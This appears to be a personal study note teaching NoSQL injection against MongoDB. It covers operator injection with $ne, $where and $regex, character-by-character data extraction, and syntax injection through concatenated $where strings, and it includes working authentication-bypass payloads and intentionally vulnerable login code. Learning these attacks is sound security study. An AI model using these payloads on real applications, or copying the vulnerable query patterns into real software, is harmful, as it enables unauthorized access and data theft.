---
created: 2026-05-07
tags:
  - web_hacking
status: incomplete
---
## NoSQL injection

>**NoSQL injection** is a security vulnerability that allows attackers to interfere with queries made by an application to a **NoSQL database** (such as **MongoDB**, **CouchDB**, or **Redis**).

- While SQL syntax is consistent across DBMSs (with only minor syntactical variations), each NoSQL database engine defines its own distinct syntax. Each NoSQL injection is specific to the target implementation (MongoDB, Neo4j, Cassandra, etc.).

>[!into]+ NoSQL databases
>**NoSQL** (also known as **non-relational** or **Not Only SQL**) is an approach to database management systems designed to store and retrieve data using flexible, schema-less data models (rather than the traditional tabular structures of relational databases). 
>- NoSQL databases generally have **fewer relational constraints and weaker type enforcement** than SQL engines. They are used for **unstructured** and **semi-structured data**.
>- **Unstructured data** lacks a predefined schema or formal organization (e.g., emails, images, videos, audio files, social media posts, etc.). **Semi-structured data** sits between structured and unstructured data formats: it doesn't adhere to a tabular schema of traditional relational databases but still retains organizational elements like tags, metadata, or key-value pairs (e.g., JSON, XML, log files, etc.).

- There are two main types of NoSQL injection attacks:
	- **Syntax injection** 
		- Manipulating the *structure* or *syntax* of a NoSQL query to inject arbitrary code.
	- **Operator injection**
		- Injecting a NoSQL query operator (e.g., `$ne`, `$gt`, `$regex`, `$where`) to alter query logic.

>[!note] Most examples in this guide focus on NoSQL injection in MongoDB, which is the most commonly used NoSQL database. 

## Operator injection

- Unlike SQL databases, MongoDB queries are represented as **JSON objects**. Each field in the query normally maps to a literal value (e.g., a username or password). But MongoDB also supports **query operators** such as `$ne`, `$gt`, `$in`, `$or`, and `$regex` that modify how a field is matched.
- If user-controlled input is directly inserted into a JSON query without proper validation, **you can inject query operators** to manipulate the query logic.

- MongoDB operators:

|Operator|Description|
|---|---|
|`$ne`|Not equal|
|`$gt`|Greater than|
|`$gte`|Greater than or equal|
|`$lt`|Less than|
|`$lte`|Less than or equal|
|`$or`|Logical OR|
|`$and`|Logical AND|
|`$exists`|Checks whether a field exists|
|`$in`|Matches values contained in a list|
|`$nin`|Matches values not contained in a list|
|`$regex`|Matches values using a regular expression|


>[!example]+ 
> - Suppose an application uses the following MongoDB query for login functionality:
> 
> ```js
> app.post("/login", async (req, res) => {
> 	const username = req.body.username;
> 	const password = req.body.password;
> 	
> 	const user = await db.collection("users").findOne({
> 	    username: username,
> 	    password: password
> 	});
> 	if(user){
> 		res.send("Logging in...");
> 	} else {
> 		res.send("Invalid username or password");
> 	}
> });
> ```
> 
> - A normal login request would look like:
> 
> ```json
> {
>     "username":"jane",
>     "password":"secret"
> }
> ```
> 
> - But you inject MongoDB operators instead:
> 
> ```json
> {
>     "username":{
>         "$ne":null
>     },
>     "password":{
>         "$ne":null
>     }
> }
> ```
> 
> - MongoDB interprets this as:
> 
> ```json
> db.users.findOne({
>     username: {
>         $ne: null
>     },
>     password: {
>         $ne: null
>     }
> });
> ```
> 
> - Meaning: "Find a record in the `users` collection such as `username != null` AND `password != null`". Since every normal account satisfies this condition, the application returns the first record in the database -> you have an authentication bypass.


>[!example]+
> Another common injection format is URL-encoded form data. Some frameworks automatically convert nested parameters into JSON objects. For example:
> 
> ```http
> POST /login
> ...
> 
> username[$ne]=1&password[$ne]=1
> ```
> 
> may be parsed as:
> 
> ```json
> {
>     "username": {
>         "$ne": "1"
>     },
>     "password": {
>         "$ne": "1"
>     }
> }
> ```

### Detecting operator injection 

- To test if you can inject operators, add the `$where` operator as an additional parameter, then send one request where the condition evaluates to `false`, and another that evaluates to `true`:

```json
{"username":"jane","password":"anything", "$where":"0"} // false
{"username":"jane","password":"anything", "$where":"1"} // true
```

- If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.
### Extracting field names

- If you have injected an operator that allows you to run JavaScript, try to use the `keys()` method to extract data field names:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

- This inspects the first data field in the user object and returns the first character of the field name, so you can use it to extract field names character-by-character.

### Extracting data using operators

- MongoDB's `$regex` operator is used to match values using regular expressions.
- If you can't inject JavaScript, try to use the `$regex` operator to extract data character-by-character:

```json
{"username":{"$regex":"^a*"},"password":{"$ne":null}}
```

```json
"$regex":"^a.*"
"$regex":"^ad.*"
"$regex":"^adm.*"
"$regex":"^admi.*"
"$regex":"^admin.*"
```

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

## Syntax injection

- NoSQL syntax injection exploits applications that **construct NoSQL queries by concatenating user input into query strings**.
- Instead of injecting MongoDB operators such as `$ne` or `$regex`, you can attempt to **break the intended query syntax** and inject additional expressions that modify the query logic.
 - This type of vulnerability commonly occurs when applications use MongoDB's `$where` operator or otherwise embed user input into JavaScript code executed by the database.

>[!example]+
> 
> - Suppose an application implements authentication using MongoDB's `$where` operator:
> 
> ```js
> const username = req.body.username;
> const password = req.body.password;
> 
> const query = {
>     $where:
>         "this.username == '" + username +
>         "' && this.password == '" + password + "'"
> };
> 
> const user = db.users.findOne(query);
> ```
> 
> - A legitimate request:
> 
> ```json
> {
>     "username": "jane",
>     "password": "secret"
> }
> ```
> 
> - results in the following query:
> 
> ```json
> {
>     $where: "this.username == 'jane' && this.password == 'secret'"
> }
> ```
> 
> - But if the application concatenates user input directly into the expression, you can inject `' || true || '` as the username, and the query becomes:
> 
> ```json
> {
>     $where:
>         "this.username == '' || true || '' && this.password == 'anything'"
> }
> ```
> 
> - Since `true` always evaluates to `true`, the `$where` expression succeeds regardless of the provided password. You are authenticated as the first matching user in the database. 

- One of the simplest ways to identify syntax injection is to submit special characters, polyglot payloads, or fuzz strings and observe the application's response:

```
'"`{ 
;$Foo} 
$Foo \xYZ
```

- If the application returns parsing errors/stack traces, or exhibits different behavior, it may indicate that user input is being interpreted as part of the query syntax rather than as data.

>[!tip] You can also use dedicated NoSQL fuzzing wordlists, such as [`cr0hn/nosqlinjection_wordlist`](https://github.com/cr0hn/nosqlinjection_wordlists). 
## References and further reading

- [`NoSQL injection — PortSwigger Web Security Academy`](https://portswigger.net/web-security/nosql-injection)
- [`NoSQL Injection — swisskyrepo/PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [`What is NoSQL Injection? Exploitations and Security Best Practices — vaadata`](https://www.vaadata.com/en/blog/what-is-nosql-injection-exploitations-and-security-best-practices/)
